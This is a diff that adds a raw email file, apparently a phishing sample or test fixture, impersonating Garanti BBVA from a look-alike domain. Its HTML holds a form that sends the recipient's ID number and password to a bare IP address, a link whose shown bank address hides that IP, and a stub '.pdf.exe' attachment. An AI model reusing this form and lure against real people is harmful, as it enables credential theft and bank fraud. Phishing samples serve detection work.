@@ -1,0 +1,49 @@
+From: Garanti BBVA =?utf-8?b?TcO8xZ90ZXJp?= Hizmetleri
+ <no-reply@garantibbva-guvenlik.xyz>
+To: "Mustafa AK" <mustafa@mustafaak0.dev>
+Subject: =?utf-8?b?SGVzYWLEsW7EsXogYXNrxLF5YSBhbMSxbmTEsSAtIGhlbWVuIGRvxJ9y?=
+ =?utf-8?q?ulama_yap=C4=B1n?=
+Date: Thu, 12 Nov 2026 09:50:00 +0300
+Authentication-Results: mx.mustafaak0.dev; spf=softfail (domain of
+ transitioning garantibbva-guvenlik.xyz discourages 185.220.101.4)
+ smtp.mailfrom=garantibbva-guvenlik.xyz; dkim=none; dmarc=none (p=NONE
+ dis=NONE) header.from=garantibbva-guvenlik.xyz
+Received: from srv-guvenlik.garantibbva-guvenlik.xyz
+ (srv-guvenlik.garantibbva-guvenlik.xyz [185.220.101.4]) by mx.mustafaak0.dev
+ with ESMTPS id a1b2c351; Thu, 12 Nov 2026 09:51:00 +0300
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============4213189200158935096=="
+
+--===============4213189200158935096==
+Content-Type: multipart/alternative;
+ boundary="===============7235808856088510589=="
+
+--===============7235808856088510589==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+Hesabınızı doğrulayın.
+
+--===============7235808856088510589==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Say=C4=B1n M=C3=BC=C5=9Fterimiz,</p><p>Hesab=C4=B1n=C4=B1z ask=
+=C4=B1ya al=C4=B1nm=C4=B1=C5=9Ft=C4=B1r. Do=C4=9Frulama i=C3=A7in giri=C5=9F =
+yap=C4=B1n:</p><form action=3D"http://185.220.101.4/giris" method=3D"POST">TC=
+KN: <input name=3D"t"><br>=C5=9Eifre: <input name=3D"p" type=3D"password"><bu=
+tton>Do=C4=9Frula</button></form><p><a href=3D"http://185.220.101.4/giris">ww=
+w.garantibbva.com.tr</a></p></body></html>
+
+--===============7235808856088510589==--
+
+--===============4213189200158935096==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="fatura.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAEAAAA//8gZmFrZSBwYXlsb2Fk
+
+--===============4213189200158935096==--
